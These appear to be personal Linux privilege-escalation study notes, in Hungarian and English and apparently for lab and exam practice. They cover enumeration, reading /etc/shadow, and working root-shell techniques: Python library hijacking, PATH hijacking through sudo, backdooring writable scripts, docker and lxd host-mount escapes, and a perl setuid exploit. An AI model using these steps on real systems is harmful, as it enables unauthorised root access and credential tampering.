# Linux privesc
## tactics 4
* sorrend
  * whoami, id, groups (fontos!!!!!! mert az id-bol latszik pl hogy milyen group-okban vagyunk benne !!!!)
  * id user1, id user2, id user3
    * minden user, akihez tartozik terminal (vagyis rendes user es nem technikai, le lehet kerdezni az id-val hogy milyen group-oknak a tagja)
    * ez kb ugyanaz mint ahogy a linpeas-ben is latszik szepen hogy milyen group tagja
  * sudo -l, crontab -l, ps aux
  * ls /home, ls /root, ls /, cat /etc/passwd, cat /etc/shadow
  * /var/www konyvtarat nezzuk at rendesen
    * ha tobb web server van, akkor lehet hogy valamelyiknek mashol van a konyvtara - megkereshetjuk azt is
  * netstat -ano
    * keressunk olyan portokat, amiket kivulrol nem lattunk (tipikusan pl. ami csak 127.0.0.1-en hallgatozik)
    * ha nincs netstat vagy keresunk alternativat
      * 'ss' command ugyanazt tudja mint a netstat !!!!
        * csak belulrol elerheto portok listazasa:  ss -tno
      * vagy linpeas, linenum is megmutatja
    * nezzuk meg belulrol a portot - curl, wget, ... illetve kicsatornazhatjuk ssh portforwarddal vagy valami massal es akkor lokalisan az attack machine-rol is scannelheto
  * pspy-t hagyni futni kicsit
  * linpeas, LinEnum
  * linux exploit suggester scriptek
### Vizsgan illetve nem tryhackme-s gepeken az exploit suggestert is hasznaljuk !!!!!
* PwnKit
* sudo problemak...
* kernel exploitok
* stb...
## tactics 3
* ha van script amit sudo-val futtatni tudunk egy magasabb jogosultsaggal
  * nezzuk meg hogy importal e be valamilyen lib-et
  * pl ha python script es igy kezdodik hogy 'import random'
  * akkor csinaljunk a lokal mappaba egy random.py file-t es rakjunk bele egy kodot ami nyit egy shell-t
<pre>
# random.py
import os
os.system("/bin/bash -i")
</pre>
* ha van egy binaris, amit sudo-val futtatni tudunk egy magasabb jogosultsaggal
  * nezzuk meg 'strings' paranccsal hogy van e benne valami sima bash sor ahol parancsot futtat
  * hogyha a parancs kozott olyan binaris-t hiv meg, amihez relative utat ad meg es nem absolute utat
    * akkor hozzunk letre valahova pl /tmp konyvtarba egy olyan nevu fajlt
    * plusz kiterjesztest nem kell adni neki, anelkul is irhatunk bele sima shell scriptet
    * es PATH valtozo elejehez irjuk hozza a /tmp-t
* pl a date commandot hivja meg a binaris file
<pre>
# /tmp/date (amit mi hoztunk letre)
#!/bin/bash
 /bin/bash -i

# jogosultsagot beallitjuk es path-hez hozzaadjuk
chmod 777 /tmp/date
export PATH=/tmp:$PATH (fontos hogy ele szurjuk be a /tmp-t es ne a vegere, mert akkor eloszor itt fogja keresni es igy a mienket olvassa majd be)

# run binary file
sudo ./binary_file
# whoami
root
</pre>
## tactics 2
* lehet hogy eloszor egy masik user-hez kell privesc-elnunk pl a www-data user-rol
* es csak utana az ahhoz tartozo enumeration-nel tudunk majd tovabb menni a root-ra
## tactics
* search for files
  * search for suid bit files
  * search for processes that uncommon
  * search for writable and/or executable files
* if a file is writeable (write a rev shell code in it or put a bash command to it)
* if a file is modified by another file think how to put your own code in it
* if a file is using any user controlled data like 'env var', read from another file, etc... try to modify that data
* ha van valami writable sh script, akkor irjunk bele egy reverse shell kodot es allitsunk be hozza egy listenert
  * hatha a root lefuttatja random valamikor, nem tudhatjuk ugyebar.... mert nem latjuk hogy nala mit fut
  * probalkozzunk be
## basic things
* linux exploit suggester (github mznet)
  * ad linkeket
  * ha mazlink van akkor exploit_db-s linket ad es akkor ott lesz valami guide
  * ha nincs semmi guide akkor valszeg sima gcc-vel kell a .c fajlt leforditani es aztan chmod es lehet futtatni
* gyanus fajl valami nagyon jol lathato helyen, vagy ps-ben latjuk hogy fut a memoriaban
  * gyanus a neve, suid bites, valami root modban fut, vagy mas egyeb dolog van vele
  * lehet hogy ldd-vel ha megnezzuk akkor valahonnan behuz egy so fajlt
  * strings paranccsal is meg lehet nezni hogy milyen so fajlt huz be...
    * ha epp ott van benne es jol lathato
* keresni weak permission-os fajlt
  * find / -not -type l -perm -0+w
    * elvileg ami itt van azt szerkeszteni tudjuk
    * pl ha /etc/shadow itt van akkor az fasza mert ki tudjuk cserelni a hash-t valami masra
* meterpreter> post/multi/recon/local_exploit_suggester
* $ sudo -l
* linpeas.sh, LinEnum.sh
* google> "linux exploit suggester"
* google> "linux priv esc"
## searching folders with specified priv
* find / -writable -type d 2>/dev/null     # world-writeable folders
* find / -perm -222 -type d 2>/dev/null  # world-writeable folders
* find / -perm -o+w -type d 2>/dev/null    # world-writeable folders
* find / -perm -o+x -type d 2>/dev/null    # world-executable folders
* find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # world-writeable & executable folders
## SUID bit files
* find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.  
* find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.  
* find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.  
* find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID < full search  
* for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin < quicker  
* find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null  
* find / perm /u=s -user "User name that you are looking for" 2>/dev/null  
## mit futtat le barki
### ps aux-al nem mindig latszik mert ha gyorsan eltunik, akkor hiaba nezzuk
### pspy !!!
* https://github.com/DominicBreuker/pspy
## script files enabled in sudoers file with imported libraries
* if sudo -l reveals that we can run a script file with sudo and with the privilege of another user we have to use to open a shell with that user's privileges
  * if it is writable we can edit to open a shell
  * if it has any library import !!!!!!
    * we can create a local file with the name of the imported library and we can put the shell command inside it: /bin/bash
  * if it is manipulating other files - we can check the other files as well
## docker group membership
* https://flast101.github.io/docker-privesc/
### info
* By default, any machine container is run with root privileges (ie. you have root privileges inside the container). It means that any user (by default, any member of the “docker” group) who has access to the Docker Daemon has root privileges in the container.
### exploitation
* We can create our own container and transfer it to the target system
* Or we can use an existing container
### steps
* a docker parancs egy GTFObin parancs
* https://gtfobins.github.io/gtfobins/docker
* docker run -v /:/mnt --rm -it alpine chroot /mnt sh
## lxd / lxc membership
### info
* Az 'lxc' es 'lxd' kb ugyanaz a ket cucc.
  * lxc - Linux Containers
  * lxd - Linux Daemon
* Group membership kell ahhoz, hogy privescelni tudjunk (akar lxc akar lxd membership) - elvileg pont ugyanugy kell csinalni fuggetlenul attol, hogy melyik membership van meg.
* A menete az privescnek
 * Keresunk vagy csinalunk egy container image-t
 * Beallitunk rajta dolgokat, ha be kell, hogy rootkent fusson es elerjuk vele a file rendszert
 * Elinditjuk es root hozzaferesunk lesz a file rendszerhez
 * (Opcionalisan ha akarunk, akkor megoldjuk, hogy ki tudjunk torni a container-bol es akkor root-ok leszunk mar az egesz file rendszeren innentol)
 * There are now several ways in which we can exploit LXC/LXD. We can either create our own container and transfer it to the target system or use an existing container. Unfortunately, administrators often use templates that have little to no security. This attitude has the consequence that we already have tools that we can use against the system ourselves.
 * Such templates often do not have passwords, especially if they are uncomplicated test environments. These should be quickly accessible and uncomplicated to use. The focus on security would complicate the whole initiation, make it more difficult and thus slow it down considerably. If we are a little lucky and there is such a container on the system, it can be exploited. For this, we need to import this container as an image.
 * After verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the security.privileged flag and the root path for the container. This flag disables all isolation features that allow us to act on the host.
 * Once we have done that, we can start the container and log into it. In the container, we can then go to the path we specified to access the resource of the host system as root.
### build alpine image (solution A.)
<pre>
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686
</pre>
* follow with 'creating alpine container' steps...
### distro builder (solution B.)
<pre>
sudo su
#Install requirements
sudo apt update
sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
#Clone repo
git clone https://github.com/lxc/distrobuilder
#Make distrobuilder
cd distrobuilder
make
#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
</pre>
* Then, upload to the vulnerable server the files lxd.tar.xz and rootfs.squashfs
* follow with 'creating alpine container' steps...
### creating alpine container (default method) (we assume that there is no internet access on the victim machine)
* lxd group membership is presented
* alpine image is reachable locally (if it is not reachable, we can upload it via meterpreter or python server + wget)
  * (first we need to download it to the attack machine of course and then upload it the victim machine...)
<pre>
htb-student@ubuntu:~$ id
uid=1000(htb-student) gid=1000(htb-student) groups=1000(htb-student),116(lxd)
htb-student@ubuntu:~$ ls
ContainerImages  snap
htb-student@ubuntu:~$ ls ContainerImages/
alpine-v3.18-x86_64-20230607_1234.tar.gz
htb-student@ubuntu:~$ 
</pre>
* import container as an image, initiate it, configuring with security.privileged flag and root path
<pre>
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias image1
container-user@nix02:~$ lxc image list
container-user@nix02:~$ lxc init image1 container1 -c security.privileged=true
container-user@nix02:~$ lxc config device add container1 host-root disk source=/ path=/mnt/root recursive=true
container-user@nix02:~$ lxc start container1

# lehet hogy azt irja ki hogy error, akkor /bin/sh-t probaljunk /bin/bash helyett!!!!
container-user@nix02:~$ lxc exec container1 /bin/bash

# fontos, hogy a /mnt/root alatt van az uj filerendszer, nem a sima /-t kell nezni, mert az nem lesz jo !!!
root@nix02:~# ls -l /mnt/root
total 68
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot
drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom
...
root@nix02:~# whoami
root
</pre>
### creating alpine container (with internet access on the victim machine)
<pre>
lxc init ubuntu:16.04 test -c security.privileged=true
lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
lxc start test
lxc exec test bash
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
</pre>
### sources
* https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
* htb academy - linux privilege escalation modul - lxd lesson
## adm group membership
* Usually members of the group adm have permissions to read log files located inside /var/log/.
* Therefore, if you have compromised a user inside this group you should definitely take a look to the logs.
## Capabilities
### source
* https://materials.rangeforce.com/tutorial/2020/02/19/Linux-PrivEsc-Capabilities/
* https://man7.org/linux/man-pages/man7/capabilities.7.html
### short description
* lehet capability-t adni egy fajlnak es akkor azzal mindenfele dolgokat lehet csinalni
* eloszor listazzuk ki az egesz rendszerre az osszes fajlt ami rendelkezik capabilityvel (linpeas ezt is listazza ha van ilyen fajl)
<pre>
$ getcap -r / 2>/dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
</pre>
* utana pedig setcap paranccsal at kell allitani sajat magat es aztan nyitni egy shell-t
<pre>

</pre>
### original info
Capability format
<pre>
When searching for capabilities on your system, you might see something like:
/usr/bin/mtr-packet = cap_net_raw+ep

This means that the executable /usr/bin/mtr-packet has the cap_net_raw capability. As mentioned in the man page about capabilities, this allows the program to:
* use RAW and PACKET sockets;
* bind to any address for transparent proxying.
The +ep means the capability is permitted and effective.
</pre>
Capability usage
<pre>
# Assigning capabilities
# Assigning the cap_setuid capability on the specified file:
setcap cap_setuid+ep /path/to/file

# Removing capabilities
# Specifying the -r flag removes all capabilities from a file.
setcap -r /path/to/program

# Searching for capabilities
# Recursively searching the whole filesystem for any files with capabilities:
getcap -r / 2>/dev/null
</pre>
### example with perl
* sources
  * https://materials.rangeforce.com/tutorial/2020/02/19/Linux-PrivEsc-Capabilities/
  * https://gtfobins.github.io/gtfobins/perl/
<pre>
# linpeas output revealed that setuid capability is assigend to perl binary (and perl5.26.1 too...)
══╣ Parent process capabilities
Files with capabilities (limited to 50):
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/perl = cap_setuid+ep

# we are setting the setuid capability on perl binary (error-t kapunk de szarjuk le mert ettol fuggetlenul mukodni fog, jo lesz...)
$ setcap cap_setuid+ep /usr/bin/perl
unable to set CAP_SETFCAP effective capability: Operation not permitted

# appropriate perl command to set capabilities and run /bin/bash
$ usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# whoami
root
</pre>
